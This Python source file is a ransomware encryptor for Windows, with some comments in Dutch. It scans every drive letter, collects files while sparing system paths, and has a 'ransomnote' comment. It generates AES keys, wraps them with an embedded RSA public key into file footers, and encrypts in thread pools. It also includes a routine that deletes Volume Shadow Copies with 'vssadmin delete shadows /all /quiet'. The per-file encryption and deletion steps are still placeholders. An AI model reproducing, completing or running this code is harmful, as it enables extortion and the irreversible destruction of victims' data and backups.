from symEncryption import *
import ctypes
import concurrent.futures # voor threading pools
import subprocess
import psutil
import os
import time
from keygen import *
from collections import deque # voor snellere list operaties
import mmap

class Encryptor:

    def __init__(self, public_key):
        self.public_key = public_key
        self.drives = []
        self.filepaths = []

    def scan_drives(self):
        """
        a function which scans drives A-Z
        """
        start_time = time.time()
        bitmask = ctypes.windll.kernel32.GetLogicalDrives() #returns a bitmask where each bit represents a drive letter. 
        self.drives = [f"{chr(65 + i)}:\\" for i in range(26) if bitmask & (1 << i)] #converts the bit index into a letter
        end_time = time.time()

        print(f"[LOG] drives found: {self.drives}, time elapsed: {end_time - start_time}s")


    def get_files_from_drive(self, drive):
        """Retrieve all file paths from a single drive."""
        
        #These are files and directories that we wont encrypt since they will stop the os from functioning
        EXCLUDED_EXTENSIONS = {".exe", ".dll", ".sys", ".lnk", ".log"}
        EXCLUDED_FILES = {"boot.ini", "bootmgr", "ntldr", "BCD"} #add ransomnote 
        EXCLUDED_DIRS = {
            "C:\\Windows",
            "C:\\Program Files",
            "C:\\Program Files (x86)",
            "C:\\System Volume Information",
            "C:\\$WINDOWS.~BT"
        }

        filepaths = []
        
        def scan_directory(path):
            """Recursive scanning using os.scandir()"""
            try:
                with os.scandir(path) as it: 
                    for entry in it:
                        if entry.is_dir(follow_symlinks=False): #if the entry is a directory, check if it's in EXCLUDED_DIRS
                            if entry.path in EXCLUDED_DIRS:
                                continue
                            scan_directory(entry.path)
                        
                        elif entry.is_file():
                            if (
                                entry.name.lower() not in EXCLUDED_FILES and #check if its name is in EXCLUDED_FILES
                                not entry.name.lower().endswith(tuple(EXCLUDED_EXTENSIONS)) #check if it has an excluded extension
                            ):  
                                
                                if "pictures" in entry.path.lower(): #just filter on desktop and pictures
                                    filepaths.append(entry.path)  # Store normal files
            
            except (PermissionError, FileNotFoundError):
                pass  # skip directories that cannot be accessed
       
        scan_directory(drive) #call function scan directory

        #print(filepaths)

        return filepaths

    def get_files(self):
        """
        run multiple threads at once to scan a drive for files, this will execute file collection across multiple drives at once.
        Instead of scanning one drive at a time, multiple drives are scanned simultaneously, making it much faster.
        """
        start_time = time.time()
        with concurrent.futures.ThreadPoolExecutor() as executor: #
            results = executor.map(self.get_files_from_drive, self.drives)
        
        # Flatten results
        self.filepaths = [file for result in results for file in result]  # Extract normal files
        
        end_time = time.time()
        print(f"[LOG] Files found: {len(self.filepaths)}, time elapsed: {end_time - start_time:.2f}s")

    def encrypt(self, files_list, counter=10000):
        """
        The encrypt function called by threading.
        """
        encrypted_count = 0
        files_list = deque(files_list)  # O(1) verwijderingen met deque

        while files_list:  # Loop zolang er bestanden zijn
            encrypted_count += 1
            filepath = files_list.popleft()  # Verwijder bestand uit deque (O(1))

            # Genereer een nieuwe sleutel elke 1000 bestanden
            if counter >= 1000:
                print("[LOG] Generating new AES key...")
                symenc = Symmetric_encryption()
                symenc.generate_key()
                footer = self.generate_footer(symenc.iv, symenc.AES_key)
                counter = 1  # Reset teller

            counter += 1
            
            # TODO: encryptielogica
            try:

                # open file 

                #encrypt data
                encrypted_content = symenc.encrypt_string("test")
                print(f"{encrypted_content}" )
                    
                
                
                #open new file with .ENC enxtension
                    #add encrypted content
                    #add footer

                #delete original file
            
            except:
                pass

        print(f"[LOG] {encrypted_count} files encrypted")

    def generate_footer(self, iv, AES_key):
        """
        this function is called for everyfile and creates the footer
        """
        
        #load in the public key
        keygen = Encryption("id:1")
        keygen.load_public_key(self.public_key)


        #encrypt iv
        encrypted_iv = keygen.encrypt(iv)
        
        #encrypt AES key
        encrypted_key = keygen.encrypt(AES_key)
        #print(f"footer: {encrypted_iv} {encrypted_key}")
        #create footer
        return f"{encrypted_iv} {encrypted_key}"
    
    @staticmethod
    def determine_thread_count():
        """Determines optimal thread count based on system specs."""
        
        cpu_count = psutil.cpu_count(logical=True)  # Logical cores
        phys_cores = psutil.cpu_count(logical=False)  # Physical cores
        cpu_load = psutil.cpu_percent(interval=1)  # Current CPU usage %
        mem = psutil.virtual_memory()  # Get RAM info
        
        # Default thread count: Use 80% of available logical cores
        thread_count = max(1, int(cpu_count * 0.8))

        # If system is under high load (CPU > 70% or RAM < 1GB free), reduce threads
        if cpu_load > 70 or mem.available < 1 * 1024**3:
            thread_count = max(1, thread_count // 2)

        # Cap threads at physical core count if low on resources
        if cpu_load > 85 or mem.available < 512 * 1024**2:
            thread_count = max(1, phys_cores)

        return thread_count

    # Example usage:
    optimal_threads = determine_thread_count()
    print(f"Optimal thread count: {optimal_threads}")
    
    def start_encryption_process(self):
        """
        a function which starts a thread for encrytion, it will spaw multiple threads
        """
        threads = self.determine_thread_count()
        #threads = 40

        #split list by amount of threads

        avg_len = len(self.filepaths) // threads   # Average size of each chunk
        remainder = len(self.filepaths) % threads   # Remainder to distribute across parts

        result = []  # List to hold the resulting parts
        start = 0  # Start index for each split

        for i in range(threads):
            # Calculate end index for each part
            end = start + avg_len + (1 if i < remainder else 0)
            result.append(self.filepaths[start:end])  # Append the split list to result
            start = end  # Update start index for next chunk

        #call threads to encrypt and pass a section of the list
        #threads = []

        # Maak een thread voor de split file list
        start_time = time.time()

        # Verwerk de encryptie met een thread pool
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            for files in result:
                executor.submit(self.encrypt, files)
        
        #for i, files in enumerate(result):
            #thread = threading.Thread(target=self.encrypt, args=(files,)) # call the encrypt method and start a thread
            #threads.append(thread)
            #thread.start()

        # Wacht tot alle threads klaar zijn
        #for thread in threads:
            #thread.join()

        end_time = time.time()

        print(f"all files encrypted, time elapsed: {end_time-start_time}s")


    def delete_shadow_copies(self):
        """
        a method that checks if there are shadow copies
        """
        try:
            result = subprocess.run(["powershell", "-Command", "vssadmin list shadows"], capture_output=True, text=True)
            if "No items found that satisfy the query" in result.stdout:
                print("[LOG] No showdow copies found")
            else:
                subprocess.run(["vssadmin", "delete", "shadows", "/all", "/quiet"], shell=True, check=True)
                print("[LOG] Shadowcopies deleted")
        except subprocess.CalledProcessError:
            print("need administrator.")



if __name__ == "__main__":
    encrypt = Encryptor("""
-----BEGIN RSA PUBLIC KEY-----
MIGJAoGBAI8yZ4Q9xdMh2whC4NxfLwUbGAO5oTR3P9151g7Vq78cAWP/o2fZmzhQ
cLRr5QmcxQYK+oOxHPA/y4WftNyp9JibQk3v2NyFRp+CVXS6Ss9cLKFaEzHXe76Q
airp+nJl+sZa48AN+DURb5qHGn7P5qLaK2Lhfb6qpbGTDuYo2vYZAgMBAAE=
-----END RSA PUBLIC KEY-----

    """)
    encrypt.scan_drives()
    encrypt.get_files()
    encrypt.start_encryption_process()


    